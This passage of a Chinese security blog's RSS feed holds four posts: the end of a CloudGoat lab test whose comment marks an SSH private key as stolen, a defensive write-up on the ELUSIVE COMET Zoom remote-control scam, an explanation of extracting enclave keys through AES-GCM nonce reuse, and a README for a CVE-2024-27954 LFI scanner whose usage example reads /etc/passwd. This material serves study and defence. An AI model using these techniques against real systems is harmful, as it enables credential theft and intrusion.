&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;c1&#34;&gt;// 等待SSM命令的输出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;commandOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewCommandExecutedWaiter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssmClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;WaitForOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;TODO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;GetCommandInvocationInput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;CommandId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CommandId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;InstanceId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;instanceId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Minute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;failed to retrieve SSM command output&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 我们成功窃取了SSH私钥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;StandardOutputContent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--- PASS: TestScenario &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;248.47s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PASS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ok  	github.com/cloudgoat/tests/supply-chain-security	249.070s
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;我鼓励您尝试这个场景！更广泛地说，CloudGoat有一组有价值的实验室，包含许多现实世界的AWS漏洞。&lt;/p&gt;
&lt;p&gt;您对这个场景有什么看法？您如何测试您的安全实验室？您希望在CloudGoat中看到什么？让我们在Twitter上继续讨论！&lt;/p&gt;
&lt;p&gt;感谢RhinoSecurityLabs的Ryan Gerstenkorn提供的出色贡献体验！感谢您的阅读。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>防范ELUSIVE COMET Zoom远程控制攻击的技术实践</title>
        <link>http://localhost:1313/p/%E9%98%B2%E8%8C%83elusive-comet-zoom%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 02 Aug 2025 17:15:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%98%B2%E8%8C%83elusive-comet-zoom%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;防范elusive-comet-zoom远程控制攻击的技术实践&#34;&gt;防范ELUSIVE COMET Zoom远程控制攻击的技术实践
&lt;/h1&gt;&lt;h2 id=&#34;我们的遭遇经历&#34;&gt;我们的遭遇经历
&lt;/h2&gt;&lt;p&gt;当我们的CEO收到参加&amp;quot;Bloomberg Crypto&amp;quot;节目的邀请时，他立即识别出这是精心设计的社会工程攻击。攻击者通过两个Twitter账号联系，拒绝使用电子邮件沟通，并引导至非官方的Calendly页面进行日程安排。&lt;/p&gt;
&lt;h2 id=&#34;新发现的攻击指标iocs&#34;&gt;新发现的攻击指标(IoCs)
&lt;/h2&gt;&lt;p&gt;新增与ELUSIVE COMET攻击基础设施关联的账户：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;X: @KOanhHa&lt;/li&gt;
&lt;li&gt;X: @EditorStacy&lt;/li&gt;
&lt;li&gt;邮箱: bloombergconferences[@]gmail.com&lt;/li&gt;
&lt;li&gt;Zoom会议链接: https://us06web[.]zoom[.]us/j/84525670750&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;zoom远程控制功能解析&#34;&gt;Zoom远程控制功能解析
&lt;/h2&gt;&lt;p&gt;攻击者利用Zoom合法的远程控制功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;安排看似正常的商务会议&lt;/li&gt;
&lt;li&gt;在屏幕共享时请求远程控制权限&lt;/li&gt;
&lt;li&gt;将显示名改为&amp;quot;Zoom&amp;quot;伪装系统通知&lt;/li&gt;
&lt;li&gt;获得权限后安装恶意软件或窃取数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击成功的关键因素&#34;&gt;攻击成功的关键因素
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;合法业务场景掩护&lt;/li&gt;
&lt;li&gt;权限对话框未明确安全风险&lt;/li&gt;
&lt;li&gt;用户习惯性点击&amp;quot;同意&amp;quot;&lt;/li&gt;
&lt;li&gt;受害者注意力集中在业务对话&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;深度防御技术方案&#34;&gt;深度防御技术方案
&lt;/h2&gt;&lt;h3 id=&#34;终端防护配置&#34;&gt;终端防护配置
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;CrowdStrike Falcon Complete启用24/7威胁狩猎&lt;/li&gt;
&lt;li&gt;采用&amp;quot;Active&amp;quot;安全策略和云端ML防护&lt;/li&gt;
&lt;li&gt;实时检测可疑进程行为&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;系统级防护措施&#34;&gt;系统级防护措施
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;create_zoom_pppc_profile.bash  &lt;span class=&#34;c1&#34;&gt;# 创建系统级PPPC配置文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;disable_zoom_accessibility.bash  &lt;span class=&#34;c1&#34;&gt;# 每15分钟检查移除Zoom权限&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uninstall_zoom.bash  &lt;span class=&#34;c1&#34;&gt;# 每周彻底卸载Zoom&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pppc配置核心优势&#34;&gt;PPPC配置核心优势
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;系统级禁用Zoom辅助功能权限&lt;/li&gt;
&lt;li&gt;适用于所有用户账户&lt;/li&gt;
&lt;li&gt;通过代码签名精准定位官方Zoom应用&lt;/li&gt;
&lt;li&gt;用户无法通过常规方式覆盖&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tcc数据库动态监控&#34;&gt;TCC数据库动态监控
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;每15分钟扫描并重置已有权限&lt;/li&gt;
&lt;li&gt;生成安全日志用于攻击检测&lt;/li&gt;
&lt;li&gt;允许临时授权后自动清理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;彻底移除方案&#34;&gt;彻底移除方案
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;完全卸载Zoom客户端&lt;/li&gt;
&lt;li&gt;清除所有残留组件和缓存&lt;/li&gt;
&lt;li&gt;强制使用浏览器参会&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;扩展安全建议&#34;&gt;扩展安全建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;建立媒体采访标准化流程&lt;/li&gt;
&lt;li&gt;部署Material Security等邮件安全工具&lt;/li&gt;
&lt;li&gt;配置DMARC/SPF/DKIM邮件防护&lt;/li&gt;
&lt;li&gt;创建无责安全报告文化&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;构建弹性防御体系&#34;&gt;构建弹性防御体系
&lt;/h2&gt;&lt;p&gt;通过组合技术控制(PPPC配置、TCC监控、应用卸载)与操作安全意识，组织可有效防御此类人机交互攻击。对于处理加密货币等敏感业务的环境，建议完全禁用Zoom远程控制功能。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>翻转比特的踪迹：AES-GCM在可信执行环境中的致命漏洞</title>
        <link>http://localhost:1313/p/%E7%BF%BB%E8%BD%AC%E6%AF%94%E7%89%B9%E7%9A%84%E8%B8%AA%E8%BF%B9aes-gcm%E5%9C%A8%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E8%87%B4%E5%91%BD%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sat, 02 Aug 2025 17:04:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BF%BB%E8%BD%AC%E6%AF%94%E7%89%B9%E7%9A%84%E8%B8%AA%E8%BF%B9aes-gcm%E5%9C%A8%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E8%87%B4%E5%91%BD%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;翻转比特的踪迹&#34;&gt;翻转比特的踪迹
&lt;/h1&gt;&lt;p&gt;可信执行环境(TEE)如安全飞地(secure enclave)正日益普及，用于保护云中的资产。它们的承诺很诱人：当飞地被正确使用时，即使是飞地的操作者或云服务提供商也无法访问这些资产。然而，这导致了一个强大的攻击者模型，与飞地交互的实体可能就是攻击者。在这篇博客中，我们将探讨一种涉及AES-GCM、ECDSA和Shamir秘密共享算法的加密技术在这种环境下可能失败的方式——具体来说，通过对AES-GCM使用Forbidden攻击来翻转私钥分片的比特位，我们可以迭代恢复私钥。&lt;/p&gt;
&lt;h2 id=&#34;可信飞地&#34;&gt;可信飞地
&lt;/h2&gt;&lt;p&gt;TEE有多种形式和大小。它们可以使用单独的硬件安全模块(HSM)、可信平台模块(TPM)或作为片上系统(SoC)一部分的其他专用安全芯片来实现。也可以使用内存隔离技术(如TrustZone或虚拟机监控程序)在与不可信实体共享的硬件中实现，这类例子包括Intel SGX、Amazon Nitro等安全飞地。&lt;/p&gt;
&lt;p&gt;安全飞地面临的一个挑战是它们几乎没有持久内存，因此需要在断电周期后仍然可用的大量数据必须存储在飞地外部。为了保持这些数据的安全，必须使用存储在可信环境内部或外部密钥管理服务(KMS)中的存储密钥进行加密，KMS通过某种形式的认证限制对飞地的访问。&lt;/p&gt;
&lt;p&gt;然而，由于数据存储在外部，与飞地交互的不可信实体会看到这些数据并可能修改它。即使使用强加密技术如带有关联数据的认证加密(AEAD)，飞地也很难保护自己免受回滚攻击，即不可信实体用相同数据的早期版本替换外部数据，因为两者都会通过认证。一个诱人的解决方案是对存储在飞地外部的数据进行版本控制，但由于飞地是无状态的，不知道最新版本应该是什么，这很快变成了一个先有鸡还是先有蛋的问题。因此，在这种情况下跟踪版本号或使用计数器是困难的，甚至是不可能的。&lt;/p&gt;
&lt;h2 id=&#34;在可信飞地中签名&#34;&gt;在可信飞地中签名
&lt;/h2&gt;&lt;p&gt;可信飞地的一个有趣应用是保存数字签名私钥(如ECDSA密钥)以执行签名。如果设置正确，没有人可以从飞地中窃取签名密钥。然而，由于签名密钥必须在飞地断电后仍然可用，它们通常必须以某种形式持久存储在外部存储中。为了防止任何有权访问此外部存储的人获取或修改签名密钥，需要使用AEAD对其进行加密。&lt;/p&gt;
&lt;p&gt;于是我们迎来了大家最爱的AEAD：AES-GCM！由于其脆弱的设计，一旦使用相同的nonce加密两个不同的签名密钥，认证保证就会被不可逆转地破坏。由于AES块大小限制为128位，并且需要32位用于计数器，你只有96位用于nonce。不过别担心，你只需要确保不要使用随机nonce调用AES-GCM超过2^32次！所以飞地只需要跟踪一个使用计数器。唉，正如前面所说，这基本上是不可能的。&lt;/p&gt;
&lt;p&gt;因此，攻击者可以让飞地生成任意数量的签名密钥，所有这些密钥都必须加密以存储在外部。最终，nonce会重复，攻击者可以使用Forbidden攻击恢复AES-GCM哈希密钥。细节并不十分重要，但本质上，有了AES-GCM哈希密钥，攻击者可以获取任何现有的AES-GCM密文和标签，以某种方式修改密文，并使用哈希密钥更新标签。具体来说，他们可以翻转密文中的比特位，当飞地解密时，将导致原始明文除了相同的比特位被翻转。这很不好。但有多糟糕呢？&lt;/p&gt;
&lt;h2 id=&#34;攻击ecdsa签名&#34;&gt;攻击ECDSA签名
&lt;/h2&gt;&lt;p&gt;这种攻击并非ECDSA特有，因此不需要理解ECDSA背后的所有具体数学知识。理解攻击所需的唯一重要背景是了解ECDSA密钥对是如何构造的。私钥对应一个数字(也称为标量)d。要获得相应的公钥Q，私钥乘以你想要使用的特定椭圆曲线的基点G。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Q = d · G
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过利用被破坏的AES-GCM认证，攻击者可以翻转加密私钥中的比特位，并让飞地解密并使用它来签名消息。由于AES-GCM的加密部分本质上是计数器模式，翻转加密私钥中的比特位将导致相应明文私钥中的相同比特位翻转。&lt;/p&gt;
&lt;p&gt;当我们翻转私钥的最低有效位时会发生什么？零位会变成一，这相当于给私钥加一。相反，一位会变成零，这相当于给私钥减一。本质上，比特翻转对私钥的影响取决于私钥位的未知值。&lt;/p&gt;
&lt;p&gt;这很好，但我们如何在不了解私钥的情况下知道这两种情况中哪一种发生了呢？好吧，如果我们用翻转后的私钥生成签名，我们可以通过添加或减去生成器来使用修改后的公钥验证签名。如果它用添加的生成器验证，我们知道私钥位是零，而如果它用减去的生成器验证，我们知道私钥位是一。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(d + 1) · G = d · G + G = Q + G
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(d – 1) · G = d · G – G = Q – G
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们现在可以重复这个过程来恢复私钥的其他位。我们将不再加或减一，而是加或减二的幂到私钥。通过从公钥加或减生成器的相应倍数，我们了解私钥的一个新位。严格来说，不需要一次恢复一位。你可以翻转多个位，并根据这些翻转位对私钥可能产生的所有影响尝试签名验证。&lt;/p&gt;
&lt;h2 id=&#34;分割比特&#34;&gt;分割比特
&lt;/h2&gt;&lt;p&gt;有趣的是，当私钥在加密前使用Shamir的秘密共享算法分割成不同的分片时，攻击仍然有效。飞地接收不同的加密分片，解密它们，将分片重新组合成私钥，然后签名。因此，我们不能直接翻转私钥中的单个位。&lt;/p&gt;
&lt;p&gt;但是当我们翻转其中一个分片中的位时会发生什么？在Shamir的秘密共享中(另见我们关于此主题的优秀ZKDocs文章)，每个分片由一对x和y值组成，用于使用拉格朗日插值法插值多项式。秘密值由插值多项式在x = 0处的值给出。&lt;/p&gt;
&lt;p&gt;翻转其中一个y值中的位会改变插值多项式，对应于一个不同的秘密——在我们的例子中是私钥。基本上，重新组合秘密对应于加权y值的总和，其中每个权重是一个拉格朗日系数λj，可以很容易地从x坐标计算出来(x坐标通常选择为从1开始到分片数量的连续整数)。&lt;/p&gt;
&lt;p&gt;将所有这些放在一起，翻转其中一个分片中的位会根据位的值向分片添加或减去。然后这导致向私钥添加或减去相应的拉格朗日系数λj的倍数。通过用这个修改后的私钥生成签名并使用修改后的公钥验证它们，我们可以逐位恢复秘密分片的值。获得分片后，我们可以将它们重新组合成私钥。总之，这表明飞地操作者可以从飞地中提取私钥，尽管涉及了所有的密码学和隔离。&lt;/p&gt;
&lt;h2 id=&#34;最后一位&#34;&gt;最后一位
&lt;/h2&gt;&lt;p&gt;正如对安全飞地中AES-GCM的Forbidden攻击的探索所揭示的，像AES-GCM、ECDSA和Shamir的秘密共享这样的加密原语，虽然通常很强大，但如果部署不正确，仍然可能容易受到攻击。TEE的复杂性和对抗方法的不断发展使得保护敏感数据成为一项艰巨的任务。在Trail of Bits，我们理解这些挑战。利用我们在密码学和应用安全方面的深厚专业知识，我们提供全面的系统审计，识别潜在漏洞并提供有效的缓解策略。通过与我们合作，开发人员可以更好地避免潜在的加密陷阱，并提高其TEE的整体安全状况。&lt;/p&gt;
&lt;p&gt;1 你可能会争辩说，在这个玩具示例中，KMS可以跟踪使用计数器，因为它控制着对存储密钥的访问。然而，在实践中，KMS通常在可以加密和解密的数据类型上相当有限(通常只是加密密钥)。例如，加密秘密密钥分片很可能是不可能的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>WordPress wp-automatic插件LFI漏洞扫描工具(CVE-2024-27954)</title>
        <link>http://localhost:1313/p/wordpress-wp-automatic%E6%8F%92%E4%BB%B6lfi%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7cve-2024-27954/</link>
        <pubDate>Sat, 02 Aug 2025 16:52:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/wordpress-wp-automatic%E6%8F%92%E4%BB%B6lfi%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7cve-2024-27954/</guid>
        <description>&lt;h1 id=&#34;cve-2024-27954---wordpress-wp-automatic插件lfi扫描器&#34;&gt;CVE-2024-27954 - WordPress wp-automatic插件LFI扫描器
&lt;/h1&gt;&lt;p&gt;本项目提供了一个基于Python的本地文件包含(LFI)漏洞扫描工具，针对WordPress插件wp-automatic中的关键漏洞&lt;strong&gt;CVE-2024-27954&lt;/strong&gt;。该漏洞允许未经验证的攻击者使用&lt;code&gt;file://&lt;/code&gt;注入向量读取服务器上的任意文件。&lt;/p&gt;
&lt;h2 id=&#34;-漏洞摘要&#34;&gt;🚨 漏洞摘要
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE编号:&lt;/strong&gt; CVE-2024-27954&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;受影响组件:&lt;/strong&gt; WordPress &lt;code&gt;wp-automatic&lt;/code&gt;插件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响:&lt;/strong&gt; 本地文件包含(LFI)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;风险:&lt;/strong&gt; 远程未授权文件读取(如&lt;code&gt;/etc/passwd&lt;/code&gt;、配置文件、源代码等)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击向量:&lt;/strong&gt; 使用&lt;code&gt;file://&lt;/code&gt;方案的不受信任&lt;code&gt;link&lt;/code&gt;参数&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-功能特点&#34;&gt;🔧 功能特点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;扫描单个或多个目标URL&lt;/li&gt;
&lt;li&gt;测试单个或多个LFI文件路径&lt;/li&gt;
&lt;li&gt;支持代理(如BurpSuite)&lt;/li&gt;
&lt;li&gt;多线程扫描&lt;/li&gt;
&lt;li&gt;将易受攻击的目标输出到文件&lt;/li&gt;
&lt;li&gt;人性化的控制台输出&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-环境要求&#34;&gt;📦 环境要求
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Python 3.x&lt;/li&gt;
&lt;li&gt;&lt;code&gt;requests&lt;/code&gt;模块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;安装依赖:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install requests
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;-使用方法&#34;&gt;🚀 使用方法
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 CVE-2024-27954.py --url http://目标地址 --lfi-path /etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;参数&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--url&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;单个目标URL(如&lt;code&gt;http://目标:8080&lt;/code&gt;)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--list&lt;/code&gt;&lt;/td&gt;
